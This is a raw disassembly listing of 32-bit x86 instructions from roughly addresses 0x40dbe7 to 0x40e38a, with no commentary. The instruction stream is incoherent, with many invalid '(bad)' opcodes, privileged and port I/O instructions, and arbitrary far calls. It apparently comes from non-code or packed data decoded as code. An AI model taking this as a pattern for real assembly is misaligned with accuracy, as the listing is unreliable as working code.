  40dbe7:	(bad)  
  40dbe8:	imul   DWORD PTR [ecx+0x38]
  40dbeb:	jle    0x40dc24
  40dbed:	das    
  40dbee:	lods   eax,DWORD PTR ds:[esi]
  40dbef:	sbb    al,0xe6
  40dbf1:	lock sub al,BYTE PTR fs:0xb0dc1dbe
  40dbf9:	sub    al,0x2c
  40dbfb:	mov    eax,ds:0x27873640
  40dc00:	pop    esp
  40dc01:	retf   0x45c4
  40dc04:	cmc    
  40dc05:	xchg   edi,eax
  40dc06:	aam    0x37
  40dc08:	(bad)  
  40dc09:	jne    0x40dc1e
  40dc0b:	fst    DWORD PTR [edx+0x9894af2]
  40dc11:	lods   al,BYTE PTR ds:[esi]
  40dc12:	das    
  40dc13:	xor    esp,DWORD PTR [ebp+eiz*8-0x100fc68e]
  40dc1a:	add    cl,BYTE PTR [ebp-0x19]
  40dc1d:	hlt    
  40dc1e:	cld    
  40dc1f:	in     al,dx
  40dc20:	mov    edi,0x8a0178eb
  40dc25:	xabort 0x23
  40dc28:	cld    
  40dc29:	(bad)  
  40dc2a:	arpl   WORD PTR [eax],bp
  40dc2c:	xor    edi,edx
  40dc2e:	mov    al,0x48
  40dc30:	imul   esi,DWORD PTR [eax-0x2b],0x28
  40dc34:	xchg   ebp,eax
  40dc35:	push   eax
  40dc36:	mov    BYTE PTR [esi-0x4212cff7],ch
  40dc3c:	mov    al,ds:0x9695fcac
  40dc41:	repz xor al,BYTE PTR [ebx-0x74e0d64a]
  40dc48:	mov    edx,0x8b9a6b1
  40dc4d:	out    dx,al
  40dc4e:	ss icebp 
  40dc50:	push   0xffffffe3
  40dc52:	imul   esp,DWORD PTR [ecx-0x734547e1],0xd436f730
  40dc5c:	push   ecx
  40dc5d:	jne    0x40dc92
  40dc5f:	ret    
  40dc60:	cli    
  40dc61:	retf   
  40dc62:	daa    
  40dc63:	cmp    al,0x81
  40dc65:	add    eax,0xcbf7b1b8
  40dc6a:	mov    ebx,0xcaf49723
  40dc6f:	cmp    BYTE PTR ds:0x4a19f1ee,dh
  40dc75:	(bad)  
  40dc76:	jno    0x40dc91
  40dc78:	(bad)  
  40dc79:	sub    eax,DWORD PTR [ebx+edx*8-0x2f20c4d7]
  40dc80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc81:	clc    
  40dc82:	data16 or BYTE PTR [edx],cl
  40dc85:	xchg   ebp,eax
  40dc86:	int    0x84
  40dc88:	or     eax,DWORD PTR [eax+0x29]
  40dc8b:	stos   BYTE PTR es:[edi],al
  40dc8c:	mov    ecx,0x98ea3b9
  40dc91:	ins    BYTE PTR es:[edi],dx
  40dc92:	jle    0x40dc46
  40dc94:	aaa    
  40dc95:	dec    esi
  40dc96:	mov    eax,ds:0x94f027cd
  40dc9b:	cs ret 0x2473
  40dc9f:	xchg   ecx,eax
  40dca0:	and    bl,bh
  40dca2:	push   esi
  40dca3:	inc    esi
  40dca4:	xor    dh,BYTE PTR [edx+0x5973e386]
  40dcaa:	mov    gs,WORD PTR [edx]
  40dcac:	push   es
  40dcad:	adc    DWORD PTR [ebx-0x6671063c],ebx
  40dcb3:	sub    DWORD PTR [esi+0x88bd64f],ebx
  40dcb9:	pop    esp
  40dcba:	jmp    0x40dcd8
  40dcbc:	mov    gs,esi
  40dcbe:	mov    edi,DWORD PTR [edx+0x22]
  40dcc1:	in     al,dx
  40dcc2:	ds lahf 
  40dcc4:	fwait
  40dcc5:	in     eax,0xb6
  40dcc7:	stc    
  40dcc8:	jbe    0x40dcf2
  40dcca:	push   es
  40dccb:	xchg   esi,eax
  40dccc:	jae    0x40dd38
  40dcce:	jo     0x40dc60
  40dcd0:	imul   ecx,DWORD PTR [ebp+0x31d82968],0xffffffd9
  40dcd7:	adc    al,0x9e
  40dcd9:	cmp    al,0x1f
  40dcdb:	dec    eax
  40dcdc:	dec    edx
  40dcdd:	repnz cwde 
  40dcdf:	fcmovnbe st,st(2)
  40dce1:	inc    eax
  40dce2:	push   ecx
  40dce3:	or     eax,0x5e7a1009
  40dce8:	or     edi,edx
  40dcea:	pushf  
  40dceb:	lea    ecx,ds:0xd8bc3a2c
  40dcf1:	mov    ecx,0xeee544f3
  40dcf6:	mov    ebx,0xbc802a28
  40dcfb:	loop   0x40dd05
  40dcfd:	cmp    dh,BYTE PTR [ecx]
  40dcff:	das    
  40dd00:	dec    esp
  40dd01:	inc    edx
  40dd02:	and    DWORD PTR [ecx+0x6c],ebp
  40dd05:	sbb    al,0x3c
  40dd08:	push   cs
  40dd09:	sbb    al,0x1c
  40dd0b:	ins    BYTE PTR es:[edi],dx
  40dd0c:	mov    dl,0x56
  40dd0e:	push   ebp
  40dd0f:	cmc    
  40dd10:	jb     0x40dd7b
  40dd12:	inc    edi
  40dd13:	fidivr DWORD PTR [edi]
  40dd15:	mov    eax,DWORD PTR [ebx+ebp*8-0x4864fe0c]
  40dd1c:	clc    
  40dd1d:	js     0x40dd26
  40dd1f:	pop    es
  40dd20:	stos   DWORD PTR es:[di],eax
  40dd22:	loope  0x40dd4c
  40dd24:	enter  0x51f7,0xfa
  40dd28:	or     edi,edx
  40dd2a:	push   ss
  40dd2b:	or     al,0x3e
  40dd2d:	loop   0x40dda0
  40dd2f:	out    dx,al
  40dd30:	clc    
  40dd31:	mov    ebp,0xf307ea11
  40dd36:	push   esi
  40dd37:	sbb    BYTE PTR [ecx+edx*8+0x40b4687e],0x67
  40dd3f:	repz pop ecx
  40dd41:	xor    bl,BYTE PTR [eax]
  40dd43:	jecxz  0x40dd4f
  40dd45:	call   0xc79c:0xfb157963
  40dd4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd4d:	jae    0x40dcd9
  40dd4f:	dec    eax
  40dd50:	push   ecx
  40dd51:	dec    eax
  40dd52:	mov    WORD PTR [esi+0x43],ss
  40dd55:	push   0xcc2bd387
  40dd5a:	inc    eax
  40dd5b:	dec    eax
  40dd5d:	xor    esi,DWORD PTR [edi+0x66eda993]
  40dd63:	leave  
  40dd64:	aam    0x24
  40dd66:	inc    ebx
  40dd67:	push   ss
  40dd68:	push   ebp
  40dd69:	rol    bh,0x5
  40dd6c:	jp     0x40ddc6
  40dd6e:	xchg   esi,eax
  40dd6f:	call   0xa5f7:0x2f919e17
  40dd76:	pop    ebp
  40dd77:	mov    bl,0x73
  40dd79:	mov    BYTE PTR [edx-0x5d23f017],0x29
  40dd80:	jmp    0x5789fbd
  40dd85:	es inc ebp
  40dd87:	add    edi,DWORD PTR [edx]
  40dd89:	test   al,0x74
  40dd8b:	popf   
  40dd8c:	lods   al,BYTE PTR ds:[esi]
  40dd8d:	lods   eax,DWORD PTR ds:[esi]
  40dd8e:	pop    es
  40dd8f:	(bad)  
  40dd90:	mov    edi,0xce2f6885
  40dd95:	sahf   
  40dd96:	dec    edi
  40dd97:	and    al,0x3f
  40dd99:	in     al,0x57
  40dd9b:	push   0x5d
  40dd9d:	push   es
  40dd9e:	xchg   DWORD PTR [ebx],ecx
  40dda0:	push   ds
  40dda1:	ins    DWORD PTR es:[edi],dx
  40dda2:	out    0xf1,eax
  40dda4:	test   DWORD PTR [edi],ecx
  40dda6:	dec    ebp
  40dda7:	sub    dl,BYTE PTR [esi]
  40dda9:	loopne 0x40ddfc
  40ddab:	xchg   edi,eax
  40ddac:	xchg   DWORD PTR [esp+esi*4],eax
  40ddaf:	dec    eax
  40ddb0:	not    DWORD PTR [edi-0x6abca090]
  40ddb6:	shr    BYTE PTR [ebx+0x38],1
  40ddb9:	icebp  
  40ddba:	nop
  40ddbb:	out    0xf7,al
  40ddbd:	call   0x99266df
  40ddc2:	sbb    esi,DWORD PTR [esi]
  40ddc4:	cmp    dh,BYTE PTR [ecx+eax*4+0x59]
  40ddc8:	mov    DWORD PTR [ecx-0xe93c26b],esp
  40ddce:	loopne 0x40de30
  40ddd0:	call   0xb651:0xaa719b0d
  40ddd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddd8:	xor    eax,0xc99b8863
  40dddd:	pushf  
  40ddde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dddf:	mov    al,ds:0xc98a0cd1
  40dde4:	pop    edi
  40dde5:	jno    0x40ddc0
  40dde7:	adc    esp,DWORD PTR [esi-0x5fd693de]
  40dded:	pop    ebx
  40ddee:	mov    dl,0x7f
  40ddf0:	gs jae 0x40dd78
  40ddf3:	f2xm1  
  40ddf5:	pusha  
  40ddf6:	add    DWORD PTR [esi],esp
  40ddf8:	loope  0x40de43
  40ddfa:	outs   dx,BYTE PTR ds:[esi]
  40ddfb:	inc    esp
  40ddfc:	or     DWORD PTR [eax-0x774613ed],eax
  40de02:	sbb    BYTE PTR [edx+0x33],0x7a
  40de06:	pop    es
  40de07:	pop    ds
  40de08:	or     al,ch
  40de0a:	aad    0x64
  40de0c:	cld    
  40de0d:	sub    al,0x68
  40de0f:	and    eax,0x281dcf93
  40de14:	test   eax,0x4d5024a
  40de19:	enter  0xbe08,0xe5
  40de1d:	inc    ebp
  40de1e:	les    ebp,FWORD PTR [esi+0x4f]
  40de21:	leave  
  40de22:	aas    
  40de23:	adc    esi,DWORD PTR [esi-0x4b]
  40de26:	cmp    DWORD PTR [eax],ebp
  40de28:	sti    
  40de29:	jge    0x40ddf5
  40de2b:	(bad)  
  40de2c:	imul   esp,DWORD PTR [ebx-0x4e588679],0xffffff99
  40de33:	fisub  WORD PTR [edi]
  40de35:	xor    eax,0xcaee299c
  40de3a:	test   DWORD PTR [eax+0x350923f7],ebp
  40de40:	loopne 0x40de84
  40de42:	push   0xffffffc2
  40de44:	(bad)
  40de49:	push   edx
  40de4a:	jb     0x40de9e
  40de4c:	mov    edx,DWORD PTR [eax-0x22e45005]
  40de52:	mov    esp,0x86301f69
  40de57:	add    esp,edx
  40de59:	icebp  
  40de5a:	mov    dl,al
  40de5c:	inc    edx
  40de5d:	jle    0x40de56
  40de5f:	mov    eax,ds:0x6de7214d
  40de64:	mov    eax,ds:0x84dd787
  40de69:	xor    dh,BYTE PTR [eax-0x51]
  40de6c:	daa    
  40de6d:	jge    0x40dec9
  40de6f:	or     ecx,DWORD PTR [edi-0x2b2d0b0f]
  40de75:	stc    
  40de76:	jnp    0x40de93
  40de78:	fsubrp st(4),st
  40de7a:	push   ebx
  40de7b:	inc    eax
  40de7c:	push   ds
  40de7d:	dec    eax
  40de7e:	xchg   edi,ebp
  40de80:	pop    esp
  40de81:	jbe    0x40de69
  40de83:	or     edi,ebx
  40de85:	sub    DWORD PTR [eax-0x5f021ed7],0xffffffd7
  40de8c:	or     BYTE PTR [eax+edx*8+0x51479713],cl
  40de93:	sbb    DWORD PTR [ebx+0x47e49b2c],0xffffffe2
  40de9a:	inc    edx
  40de9b:	hlt    
  40de9c:	aaa    
  40de9d:	lahf   
  40de9e:	retf   
  40de9f:	adc    eax,0x3686075a
  40dea4:	or     esp,eax
  40dea6:	mov    WORD PTR [ecx+0x7412fdb2],ds
  40deac:	pop    esi
  40dead:	mov    DWORD PTR [esi],ecx
  40deaf:	mov    WORD PTR [eax],cs
  40deb1:	fwait
  40deb2:	sbb    BYTE PTR ds:0x626429c7,0x9
  40deb9:	push   ss
  40deba:	lahf   
  40debb:	lock or DWORD PTR [ecx+0x4a],0xb
  40dec0:	push   ebx
  40dec1:	out    dx,al
  40dec2:	js     0x40deee
  40dec4:	inc    esi
  40dec5:	xor    al,0xf4
  40dec7:	add    ebx,DWORD PTR [ebp+edx*1+0x6e09de46]
  40dece:	lock fld QWORD PTR [esp+esi*4]
  40ded2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ded3:	pop    esi
  40ded4:	fdivr  st(1),st
  40ded6:	stos   BYTE PTR es:[edi],al
  40ded7:	xchg   ebx,eax
  40ded8:	int    0x3e
  40deda:	adc    bl,BYTE PTR [edi-0x4861d239]
  40dee0:	dec    esi
  40dee1:	xlat   BYTE PTR ds:[ebx]
  40dee2:	xchg   ecx,esi
  40dee4:	stos   BYTE PTR es:[edi],al
  40dee5:	mov    esi,0xb58b5e67
  40deea:	mov    gs,WORD PTR [eax]
  40deec:	data16 add BYTE PTR [ecx+0x2dfa0daa],0x6e
  40def4:	xor    DWORD PTR [edx+0x36],esp
  40def7:	mov    esp,esp
  40def9:	mov    edi,0x65994817
  40defe:	lods   al,BYTE PTR ds:[esi]
  40deff:	sub    DWORD PTR [esi-0x48],eax
  40df02:	pop    esi
  40df03:	mov    ecx,DWORD PTR [eax]
  40df05:	(bad)  
  40df06:	dec    esi
  40df07:	retf   0xe921
  40df0a:	outs   dx,BYTE PTR ds:[esi]
  40df0b:	ret    0x60da
  40df0e:	rcl    BYTE PTR [eax-0x68e1f7],1
  40df14:	arpl   WORD PTR [esi+0x3e],dx
  40df17:	scas   al,BYTE PTR es:[edi]
  40df18:	or     esi,DWORD PTR [eax]
  40df1a:	inc    eax
  40df1b:	mov    bl,0x4d
  40df1d:	cmp    eax,0x8dd86afe
  40df22:	inc    ebx
  40df23:	inc    ecx
  40df24:	mov    bl,dh
  40df26:	mov    ah,0xc3
  40df28:	(bad)  
  40df29:	mov    eax,0x1991aa6
  40df2e:	repz aam 0x8
  40df31:	and    al,0xc0
  40df33:	mov    ds:0xb4345141,eax
  40df38:	mov    ecx,0x680748a
  40df3d:	jne    0x40df0c
  40df3f:	dec    edi
  40df40:	cmp    dl,BYTE PTR [ecx+0x5628a6e5]
  40df46:	xchg   ebp,eax
  40df47:	retf   0xec8f
  40df4a:	xchg   BYTE PTR [ecx-0x7],ah
  40df4d:	xchg   esp,eax
  40df4e:	jge    0x40df63
  40df50:	push   ebp
  40df51:	sbb    DWORD PTR [ebx],ebp
  40df53:	sub    DWORD PTR [eax-0x6c1bab3],ebp
  40df59:	push   0xffffffe3
  40df5b:	jae    0x40df29
  40df5d:	sub    eax,0x6036d187
  40df62:	or     eax,0x82c85f6f
  40df67:	pop    edi
  40df68:	fld    TBYTE PTR [ebx-0x7c]
  40df6b:	(bad)  
  40df6d:	xchg   ebx,eax
  40df6e:	push   ds
  40df6f:	(bad)  
  40df70:	jecxz  0x40df75
  40df72:	cmp    eax,0x860e4af9
  40df77:	jg     0x40dfc9
  40df79:	aam    0x5d
  40df7b:	fisubr DWORD PTR ds:0xa753d818
  40df81:	retf   0x6386
  40df84:	cmp    ebx,ecx
  40df86:	(bad)  
  40df87:	mov    ah,0xc4
  40df89:	das    
  40df8a:	sbb    ch,0xdf
  40df8d:	adc    DWORD PTR [ebx],edx
  40df8f:	adc    ch,bl
  40df91:	in     al,dx
  40df92:	mov    dh,0x22
  40df94:	stos   DWORD PTR es:[edi],eax
  40df95:	and    eax,eax
  40df97:	xchg   ecx,eax
  40df98:	and    DWORD PTR [ecx],esp
  40df9a:	push   es
  40df9b:	dec    ebx
  40df9c:	or     BYTE PTR [edx-0x60],bl
  40df9f:	mov    fs,esi
  40dfa1:	add    DWORD PTR [ebx],edi
  40dfa3:	data16 jae 0x40df9d
  40dfa6:	sbb    al,0x71
  40dfa8:	leave  
  40dfa9:	cli    
  40dfaa:	call   0xa4eec777
  40dfaf:	xor    ecx,DWORD PTR [eax]
  40dfb1:	dec    esp
  40dfb2:	or     eax,0xc29c5895
  40dfb7:	call   0xf166:0x868acf4e
  40dfbe:	(bad)  
  40dfbf:	push   cs
  40dfc0:	nop    DWORD PTR [esi+0x46]
  40dfc4:	or     BYTE PTR [esi-0x1a],bh
  40dfc7:	ja     0x40dfe4
  40dfc9:	mov    al,ds:0xf1ed5b32
  40dfce:	xor    al,0x63
  40dfd0:	cmp    esp,DWORD PTR [edx-0x7b549926]
  40dfd6:	and    eax,0x86998824
  40dfdb:	mov    ds:0xf848c672,eax
  40dfe0:	xor    edi,DWORD PTR [ecx+0x4c]
  40dfe3:	sub    BYTE PTR [ecx],bl
  40dfe5:	mov    ebp,0x9a087395
  40dfea:	sahf   
  40dfeb:	loopne 0x40e03b
  40dfed:	inc    eax
  40dfee:	mov    al,0xaa
  40dff0:	jl     0x40dfe7
  40dff2:	out    0xa,al
  40dff4:	dec    eax
  40dff5:	mov    edx,0xaaca5e7d
  40dffa:	adc    bl,ah
  40dffc:	xchg   edi,eax
  40dffd:	mov    dl,0x59
  40dfff:	(bad)  [eax]
  40e001:	scas   al,BYTE PTR es:[edi]
  40e002:	dec    edi
  40e003:	or     al,0xc9
  40e005:	int    0xda
  40e007:	jb     0x40e012
  40e009:	icebp  
  40e00a:	mov    WORD PTR [eax],ss
  40e00c:	aad    0xb
  40e00e:	mov    es,WORD PTR [edx+0x17]
  40e011:	aad    0x86
  40e013:	mov    dl,0x2d
  40e015:	push   ecx
  40e016:	xchg   DWORD PTR ds:0x93551e92,edi
  40e01c:	and    DWORD PTR [esi+0x22],ebp
  40e01f:	sub    bl,bh
  40e021:	jne    0x40e018
  40e023:	cmp    dl,BYTE PTR ds:0x15b6fa7e
  40e029:	jg     0x40e07f
  40e02b:	div    BYTE PTR [edi+0x2f4b15fd]
  40e031:	lock neg cl
  40e034:	(bad)  
  40e035:	cmp    BYTE PTR [esi],al
  40e037:	mov    al,0xa6
  40e039:	adc    DWORD PTR [edx-0x47b6ebbd],ecx
  40e03f:	test   al,0x51
  40e041:	rol    ebx,0x2d
  40e044:	sbb    eax,0xf1de0f0c
  40e049:	dec    edi
  40e04a:	or     BYTE PTR [esi-0x63d8ea08],0x1b
  40e051:	and    DWORD PTR [ebp+0x4a],eax
  40e054:	xor    ah,BYTE PTR [eax-0x16f712d8]
  40e05a:	rcl    BYTE PTR [ebp-0x1a8cde12],1
  40e060:	push   edi
  40e061:	out    dx,eax
  40e062:	sub    DWORD PTR [ecx],0x66
  40e065:	test   eax,0x9a08419c
  40e06a:	mov    ds:0x1ab41065,eax
  40e06f:	sahf   
  40e070:	in     al,0xf0
  40e072:	int3   
  40e073:	inc    ebp
  40e074:	repnz mov ds:0x2c8117a8,al
  40e07a:	fmul   QWORD PTR [ecx-0x6a7883e8]
  40e080:	or     eax,0xa557e0b2
  40e085:	sbb    bh,BYTE PTR ds:0xc789592b
  40e08b:	jge    0x40e030
  40e08d:	test   BYTE PTR [eax-0x39d2ac2f],bl
  40e093:	mov    cl,BYTE PTR [eax]
  40e095:	bound  ecx,QWORD PTR fs:[ebx-0x21]
  40e099:	or     DWORD PTR [ecx+0x71],eax
  40e09c:	call   0x82e6:0x7586ef0
  40e0a3:	inc    ebx
  40e0a4:	test   BYTE PTR [ebp-0x1605bd4],dh
  40e0aa:	xchg   ch,bl
  40e0ac:	push   ecx
  40e0ad:	mov    esp,0x5c5f0505
  40e0b2:	arpl   WORD PTR [ecx],bp
  40e0b4:	lock lea ebx,[edx+0x33]
  40e0b8:	xor    BYTE PTR [edi+esi*2+0x50],dh
  40e0bc:	xchg   BYTE PTR [esi+0x1017551c],bl
  40e0c2:	mov    edi,DWORD PTR [eax+0x79]
  40e0c5:	xor    al,0xbb
  40e0c7:	cwde   
  40e0c8:	add    ebp,eax
  40e0ca:	jmp    0x40e120
  40e0cc:	in     eax,0x4f
  40e0ce:	xchg   DWORD PTR [ebp+0x39],eax
  40e0d1:	mov    esi,0x1a381d15
  40e0d6:	fwait
  40e0d7:	mov    ebp,0xa880690b
  40e0dc:	sub    eax,0xc9955cf1
  40e0e1:	push   0xac66a7e5
  40e0e6:	aam    0x7c
  40e0e8:	pop    ecx
  40e0e9:	sub    eax,0x31e5bf80
  40e0ee:	lea    ebp,[esi]
  40e0f0:	aas    
  40e0f1:	icebp  
  40e0f2:	dec    esp
  40e0f3:	mov    eax,0xc73916f0
  40e0f8:	xor    al,0x32
  40e0fa:	sub    eax,0x6b7c084a
  40e0ff:	sub    cl,BYTE PTR [ecx+0x38dbab91]
  40e105:	sbb    DWORD PTR [eax-0x67e314d7],edx
  40e10b:	mov    BYTE PTR ss:[eax-0x1c],ch
  40e10f:	pop    esp
  40e110:	inc    edx
  40e111:	bound  esp,QWORD PTR [edi-0x7e2c8b89]
  40e117:	repz sub eax,DWORD PTR [eax+0x6613a6ab]
  40e11e:	dec    esp
  40e11f:	sub    ecx,DWORD PTR [ebx-0x651779e3]
  40e125:	push   es
  40e126:	add    ecx,0x1e2b5005
  40e12c:	xchg   DWORD PTR [eax-0xf7cbbe8],ebp
  40e132:	xor    BYTE PTR ds:0x1400cf5c,dh
  40e138:	or     esp,edx
  40e13a:	cmp    eax,0x6f5d229e
  40e13f:	xor    bl,dl
  40e141:	icebp  
  40e142:	call   0x86ca:0x39bd2946
  40e149:	jp     0x40e10c
  40e14b:	daa    
  40e14c:	xor    DWORD PTR [edx],esp
  40e14e:	sbb    BYTE PTR [edi+0x941f133],0x20
  40e155:	call   0x2f31:0xa0876afd
  40e15c:	pop    es
  40e15d:	sub    al,0x36
  40e15f:	js     0x40e0f2
  40e161:	and    ch,dl
  40e163:	sbb    al,0xd
  40e165:	xchg   edx,eax
  40e166:	lods   eax,DWORD PTR ds:[esi]
  40e167:	add    al,0xf6
  40e169:	sbb    DWORD PTR [ebp-0x254d615a],0x58
  40e170:	xchg   ecx,eax
  40e171:	dec    edi
  40e172:	retf   0xc829
  40e175:	cmp    BYTE PTR [esi],bl
  40e177:	(bad)  
  40e178:	or     ah,cl
  40e17a:	dec    edi
  40e17b:	jl     0x40e1b0
  40e17d:	inc    esi
  40e17e:	add    al,0x8
  40e180:	xchg   al,dh
  40e182:	(bad)  
  40e183:	ficomp DWORD PTR [edx+edi*2]
  40e186:	adc    eax,0xb684a847
  40e18b:	xchg   ecx,eax
  40e18c:	in     eax,0x4c
  40e18e:	mul    al
  40e190:	push   cs
  40e191:	xor    DWORD PTR [esi-0x452ac3f1],eax
  40e197:	push   ebp
  40e198:	jecxz  0x40e1f7
  40e19a:	dec    esi
  40e19b:	sub    al,BYTE PTR [ebp+0xe]
  40e19e:	daa    
  40e19f:	neg    BYTE PTR [edx]
  40e1a1:	icebp  
  40e1a2:	mov    ah,0xd9
  40e1a4:	sti    
  40e1a5:	into   
  40e1a6:	imul   DWORD PTR ds:0x25b0b903
  40e1ac:	nop
  40e1ad:	icebp  
  40e1ae:	push   ds
  40e1af:	jne    0x40e22f
  40e1b1:	ficomp WORD PTR [eax+0x7]
  40e1b4:	or     BYTE PTR [edx-0x1c],dh
  40e1b7:	or     eax,0x4f6dc8f5
  40e1bc:	out    0xf1,eax
  40e1be:	data16 cli 
  40e1c0:	sub    eax,0x93c50dca
  40e1c5:	add    bl,ch
  40e1c7:	adc    DWORD PTR [eax+esi*1],esp
  40e1ca:	je     0x40e1e1
  40e1cc:	or     BYTE PTR [esi+0x62],bh
  40e1cf:	rcr    DWORD PTR [esi+0x6b013674],1
  40e1d5:	xor    al,ah
  40e1d7:	sub    ch,cl
  40e1d9:	push   ss
  40e1da:	xlat   BYTE PTR ds:[ebx]
  40e1db:	adc    DWORD PTR [edx-0x7e],edi
  40e1de:	into   
  40e1df:	cmp    DWORD PTR [eax],0xffffffb1
  40e1e2:	jmp    0x3fbe:0x870cc815
  40e1e9:	div    esi
  40e1eb:	mov    al,0x49
  40e1ed:	pop    ds
  40e1ee:	sub    DWORD PTR [ebp-0x70ed6a58],ebp
  40e1f4:	push   es
  40e1f5:	test   BYTE PTR [edx],cl
  40e1f7:	fst    QWORD PTR [esi]
  40e1f9:	leave  
  40e1fa:	inc    eax
  40e1fb:	pop    esi
  40e1fc:	out    dx,eax
  40e1fd:	iret   
  40e1fe:	xchg   bl,ch
  40e200:	repnz mov es,WORD PTR [ebp-0x64098868]
  40e207:	jae    0x40e24d
  40e209:	cs inc edi
  40e20b:	loope  0x40e215
  40e20d:	mov    al,ds:0x53229b1d
  40e212:	nop
  40e213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e214:	sub    dl,dh
  40e216:	push   cs
  40e217:	bound  esi,QWORD PTR [ebp-0x1e]
  40e21a:	cmp    DWORD PTR [edi-0x24],eax
  40e21d:	nop
  40e21e:	out    0x5b,al
  40e220:	or     BYTE PTR [esi],ch
  40e222:	lods   eax,DWORD PTR ds:[esi]
  40e223:	or     DWORD PTR [edx+0x7fb6f5c],eax
  40e229:	icebp  
  40e22a:	hlt    
  40e22b:	and    DWORD PTR [ecx],0x59613c5
  40e231:	js     0x40e28d
  40e233:	cwde   
  40e234:	sub    DWORD PTR [edx],0xffffff86
  40e237:	sbb    eax,0xc4e92222
  40e23c:	mov    ebp,0x71288294
  40e241:	xor    dh,dh
  40e243:	mov    eax,0x109ff7f7
  40e248:	test   al,0x2a
  40e24a:	xlat   BYTE PTR ds:[ebx]
  40e24b:	jae    0x40e269
  40e24d:	jecxz  0x40e24d
  40e24f:	or     BYTE PTR ds:0xd0a76ffc,0x46
  40e256:	xchg   DWORD PTR [ecx+0x5],esi
  40e259:	push   0xb
  40e25b:	(bad)  
  40e25c:	out    0xa4,al
  40e25e:	imul   esi,DWORD PTR [edx+0x5e],0x43
  40e262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e263:	or     al,0x1b
  40e265:	sub    ax,0x6416
  40e269:	cmp    al,0x72
  40e26b:	test   eax,0xf9bc20db
  40e270:	and    al,0xf0
  40e272:	stc    
  40e273:	cdq    
  40e274:	daa    
  40e275:	push   ecx
  40e276:	mov    ds:0xcaf10f67,al
  40e27b:	sti    
  40e27c:	mov    ebp,DWORD PTR [eax-0x73]
  40e27f:	xchg   edi,eax
  40e280:	cmp    al,0x81
  40e282:	and    cl,dl
  40e284:	js     0x40e229
  40e286:	xchg   ecx,edi
  40e288:	stc    
  40e289:	jmp    0x40e22f
  40e28b:	mov    edi,0x28a63519
  40e290:	xchg   BYTE PTR [edi+0x4b],dl
  40e293:	inc    edx
  40e294:	or     BYTE PTR [eax],ch
  40e296:	cli    
  40e297:	mov    ds:0x92d198e6,eax
  40e29c:	jmp    0x8ba7afa6
  40e2a1:	lds    edi,FWORD PTR [eax-0xfdebd8]
  40e2a7:	xchg   bh,dh
  40e2a9:	popa   
  40e2aa:	jge    0x40e2b0
  40e2ac:	sub    bh,cl
  40e2ae:	add    al,0xdf
  40e2b0:	push   cs
  40e2b1:	in     al,dx
  40e2b2:	in     al,0x91
  40e2b4:	out    dx,eax
  40e2b5:	push   0x48
  40e2b7:	mov    ebp,0x5699a177
  40e2bc:	mov    DWORD PTR [ebp+0x1c269dca],esi
  40e2c2:	test   DWORD PTR [ecx],esp
  40e2c4:	gs pushf 
  40e2c6:	fucomi st,st(3)
  40e2c8:	out    0xf7,al
  40e2ca:	push   ss
  40e2cb:	add    BYTE PTR [edx+0x62],ah
  40e2ce:	and    DWORD PTR [edi-0x8],edx
  40e2d1:	leave  
  40e2d2:	xchg   ebx,eax
  40e2d3:	or     eax,0x21710208
  40e2d8:	mov    esi,0xc0cf6fd8
  40e2dd:	icebp  
  40e2de:	rol    BYTE PTR [esi+eax*8-0x4d56b55e],1
  40e2e5:	(bad)  
  40e2e6:	sbb    dh,al
  40e2e8:	pop    es
  40e2e9:	mov    bh,BYTE PTR [edi-0x43]
  40e2ec:	sub    ebx,DWORD PTR [edx]
  40e2ee:	inc    esp
  40e2ef:	dec    edx
  40e2f0:	jmp    0x40e321
  40e2f2:	stos   DWORD PTR es:[di],eax
  40e2f4:	or     ecx,DWORD PTR [eax]
  40e2f6:	ret    
  40e2f7:	sub    BYTE PTR [edx],bl
  40e2f9:	in     al,dx
  40e2fa:	push   ss
  40e2fb:	call   0x1389c708
  40e300:	gs jns 0x40e320
  40e303:	lods   al,BYTE PTR ds:[esi]
  40e304:	cli    
  40e305:	xlat   BYTE PTR ds:[ebx]
  40e306:	js     0x40e2cb
  40e308:	int3   
  40e309:	into   
  40e30a:	sbb    BYTE PTR [ebx-0x2f],ah
  40e30d:	jno    0x40e34b
  40e30f:	test   eax,0x2f5b4880
  40e314:	scas   al,BYTE PTR es:[edi]
  40e315:	push   ebx
  40e316:	xchg   BYTE PTR [edi+0xb],dl
  40e319:	sar    ch,cl
  40e31b:	xchg   dh,ah
  40e31d:	push   ds
  40e31e:	add    al,al
  40e320:	leave  
  40e321:	in     eax,dx
  40e322:	ss pusha 
  40e324:	aas    
  40e325:	(bad)  
  40e326:	mov    DWORD PTR [edi],esi
  40e328:	mov    WORD PTR [esi],?
  40e32a:	xchg   DWORD PTR [ebx-0xbc11bf7],ebx
  40e330:	cs jecxz 0x40e332
  40e333:	(bad)  
  40e334:	push   edi
  40e335:	enter  0xac54,0xaf
  40e339:	ins    BYTE PTR es:[edi],dx
  40e33a:	fistp  QWORD PTR [ebx+0x37]
  40e33d:	popf   
  40e33e:	add    DWORD PTR [ebp-0x4e],edx
  40e341:	prefetchw BYTE PTR [eax-0x48796631]
  40e348:	push   ecx
  40e349:	pop    ecx
  40e34a:	sub    BYTE PTR [eax+0x43],dl
  40e34d:	xor    al,0x52
  40e34f:	push   edx
  40e350:	call   0x5cb3:0x663485b1
  40e357:	xchg   edi,eax
  40e358:	das    
  40e359:	xchg   edx,eax
  40e35a:	adc    DWORD PTR [ecx-0x1c73ecb9],ecx
  40e360:	push   cs
  40e361:	mov    cl,0x20
  40e363:	lods   eax,DWORD PTR ds:[esi]
  40e364:	xchg   DWORD PTR [eax],edx
  40e366:	mov    BYTE PTR cs:[ecx+0x64],ah
  40e36a:	cwde   
  40e36b:	sub    BYTE PTR [edx-0x42],bl
  40e36e:	lods   al,BYTE PTR ds:[esi]
  40e36f:	pusha  
  40e370:	or     ah,ch
  40e372:	popa   
  40e373:	jle    0x40e3ad
  40e375:	enter  0xbeb9,0x8e
  40e379:	icebp  
  40e37a:	xchg   BYTE PTR [edx-0x652cf425],al
  40e380:	inc    ecx
  40e381:	adc    eax,0xf078a46c
  40e386:	hlt    
  40e387:	rcr    ebp,cl
  40e389:	pop    ecx
  40e38a:	imul   edi,DWORD PTR [ebx],0xffffffbd
